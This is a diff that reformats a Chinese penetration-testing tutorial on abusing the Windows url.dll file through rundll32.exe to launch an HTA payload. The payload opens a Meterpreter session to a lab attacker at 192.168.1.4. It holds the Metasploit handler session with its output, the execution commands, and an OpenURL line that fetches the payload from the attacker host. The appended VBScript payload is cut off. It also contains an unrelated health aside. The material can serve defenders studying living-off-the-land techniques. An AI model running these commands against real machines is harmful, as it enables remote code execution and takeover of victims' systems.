@@ -1,27 +1,28 @@
-# 专注APT攻击与防御
- https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
 痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。
 
-**Url.dll简介：**
+### Url.dll简介：
 
 url.dll是Internet快捷壳扩展相关应用程序接口系统文件。
 
 **说明：**url.dll所在路径已被系统添加PATH环境变量中，因此，url.dll命令可识别，但由于为dll文件，需调用rundll32.exe来执行。
 
 Windows 2003 默认位置：
-`C:\Windows\System32\url.dll
-C:\Windows\SysWOW64\url.dll`
+```bash
+C:\Windows\System32\url.dll
+C:\Windows\SysWOW64\url.dll
+```
 
 Windows 7 默认位置：
-`C:\Windows\System32\url.dll
-C:\Windows\SysWOW64\url.dll`
+```bash
+C:\Windows\System32\url.dll
+C:\Windows\SysWOW64\url.dll
+```
 
-**攻击机：** 192.168.1.4 Debian
+**攻击机：** 192.168.1.4 Debian  
 **靶机：** 192.168.1.3 Windows 7
 
-**配置攻击机msf：**
+### 配置攻击机msf：
 ```bash
 msf exploit(multi/handler) > show options 
 
@@ -52,9 +53,11 @@ msf exploit(multi/handler) > exploit
 ```
 ![](media/34dcce4115809e6e8606cd1ef8322301.jpg)
 
-**靶机执行：**
+### 靶机执行：
 
-`rundll32.exe url.dll,FileProtocolHandler file://C:\Users\John\Desktop\Micropoor_url_dll.hta`
+```bash
+rundll32.exe url.dll,FileProtocolHandler file://C:\Users\John\Desktop\Micropoor_url_dll.hta
+```
 
 ```bash
 msf exploit(multi/handler) > exploit 
@@ -68,14 +71,17 @@ meterpreter > getuid
 Server username: John‐PC\John
 meterpreter > getpid
 Current pid: 8584 
-```
+```  
+
 ![](media/35593539e0127b86c28eef1e16e5f52b.jpg)
 
 同样可以调用url.dll下载payload：
 
-`rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta`
+```bash
+rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta
+```
 
-## 附录：Micropoor_url_dll.hta
+### 附录：Micropoor_url_dll.hta
 
 ```VB
 <script language="VBScript"> 
